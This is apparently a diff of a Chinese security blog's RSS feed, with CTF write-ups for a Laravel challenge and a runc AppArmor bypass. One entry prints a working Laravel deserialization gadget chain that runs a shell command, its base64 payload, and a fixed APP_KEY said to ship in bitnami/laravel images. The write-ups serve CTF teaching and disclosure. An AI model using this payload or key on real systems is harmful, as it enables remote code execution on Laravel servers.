@@ -22,7 +22,7 @@ if [[ ! -f /app/config/database.php ]]; then log &amp;quot;Creating laravel appl
  请在http://139.159.204.145:3000/ 中获取文件/flag的内容。
 附件：https://github.com/ssst0n3/ssst0n3_challenges_public/tree/main/container/latest_laravel/attachments
  exploit 在这个挑战中，我把EncryptCookies.php文件中的$serialize变量设置为true，以使攻击更容易。
-protected static $serialize = true; 只要我们能得到APP_KEY来加密我们的有效载荷，我们就可以进行反序列化攻击。
+protected static $serialize = true; 只要我们能得到APP_KEY来加密我们的payload，我们就可以进行反序列化攻击。
 而APP_KEY可以通过迭代所有镜像来找到。
 exploit:
 ╭─st0n3@yoga in ~/ctf_project/my_challenges/container/latest_laravel/exp on master ✔ (origin/master) ╰$ ./exp.sh + APP_KEY=xmdC9cSx0QWwOtm9mdG0xfdS3HWQJRtG4DhxmA3pOz4= + python -c import base64;print base64.b64encode(&amp;quot;&amp;quot;&amp;quot;O:40:&amp;quot;Illuminate\\Broadcasting\\PendingBroadcast&amp;quot;:2:{s:9:&amp;quot;\x00*\x00events&amp;quot;;O:25:&amp;quot;Illuminate\\Bus\\Dispatcher&amp;quot;:1:{s:16:&amp;quot;\x00*\x00queueResolver&amp;quot;;s:6:&amp;quot;system&amp;quot;;}s:8:&amp;quot;\x00*\x00event&amp;quot;;O:34:&amp;quot;Illuminate\\Queue\\CallQueuedClosure&amp;quot;:2:{s:10:&amp;quot;connection&amp;quot;;s:9:&amp;quot;cat /flag&amp;quot;;s:23:&amp;quot;deleteWhenMissingModels&amp;quot;;b:0;}}&amp;quot;&amp;quot;&amp;quot;) + PAYLOAD_BASE64=Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9czo4OiIAKgBldmVudCI7TzozNDoiSWxsdW1pbmF0ZVxRdWV1ZVxDYWxsUXVldWVkQ2xvc3VyZSI6Mjp7czoxMDoiY29ubmVjdGlvbiI7czo5OiJjYXQgL2ZsYWciO3M6MjM6ImRlbGV0ZVdoZW5NaXNzaW5nTW9kZWxzIjtiOjA7fX0= + .</description>
@@ -51,6 +51,22 @@ I am a security researcher. Seems I have found a vulnerability in docker image b
 三、漏洞简介 1. 简介 在容器镜像中可以声明一个VOLUME, 挂载至/proc, 欺骗runc使其认为AppArmor已经成功应用，从而绕过AppArmor策略。
 这个漏洞由Adam Iwaniuk发现，并在DragonSector CTF期间披露。
 这个CTF题目挑战将一个文件挂载到/flag-&amp;lt;random&amp;gt;，并使用 AppArmor 策略拒绝访问该文件。选手可以利用这个漏洞来禁用这个策略并读取文件。</description>
+    </item>
+    
+    <item>
+      <title>出题报告: container/latest_laravel</title>
+      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/%E5%87%BA%E9%A2%98/hwctf202002/%E5%87%BA%E9%A2%98%E6%8A%A5%E5%91%8A-containerlatest_laravel.html</link>
+      <pubDate>Thu, 04 Feb 2021 07:55:36 +0000</pubDate>
+      
+      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/%E5%87%BA%E9%A2%98/hwctf202002/%E5%87%BA%E9%A2%98%E6%8A%A5%E5%91%8A-containerlatest_laravel.html</guid>
+      <description>出题报告: container/latest_laravel 一、题目基本信息  题目标题：latest_laravel 题目类别：container 难度：4/5 预计解题时间：8h 收录比赛：hwctf202102   请获取服务器http://{hostname}中/flag文件内容，flag格式为flag{xxx}
+题目附件：https://github.com/ssst0n3/ssst0n3_challenges_public/tree/main/container/latest_laravel/attachments
+ 二、设计思路 1. a 0day of image bitnami/laravel 如果用户在使用bitnami/laravel镜像时，/app/config/database.php文件不存在，则/tmp/app/.env会覆盖/app/.env
+ if [[ ! -f /app/config/database.php ]]; then log &amp;quot;Creating laravel application&amp;quot; cp -a /tmp/app/. /app/ fi https://github.com/bitnami/bitnami-docker-laravel/blob/master/7/debian-10/rootfs/app-entrypoint.sh
+虽然laravel在安装时会随机生成APP_KEY, 但在每个bitnami/laravel镜像build时，已经是一个确定值了。 因此我们可以知道所有bitnami/laravel镜像的APP_KEY, 而这个文件对laravel框架的安全性是至关重要的。
+根据这个供应链层的漏洞，出了这个题目。
+2. From APP_KEY disclosure to laravel RCE 可借鉴：
+ https://github.com/ambionics/phpggc/tree/master/gadgetchains/Laravel/RCE/7 https://github.com/kozmic/laravel-poc-CVE-2018-15133  三、writeup 1. something interesting  docker-compose.yml在使用bitnami/laravel时，使用了latest标签，而不是一个固定的版本 docker-compose.yml在挂载文件时，挂载到了/tmp/目录，而不是/app目录 奇怪的一句话： archived @Jan 31, 2021 at 7:54 pm，好像是在说这个文件归档的时间点 目前laravel的最新版本是8.</description>
     </item>
     
     <item>
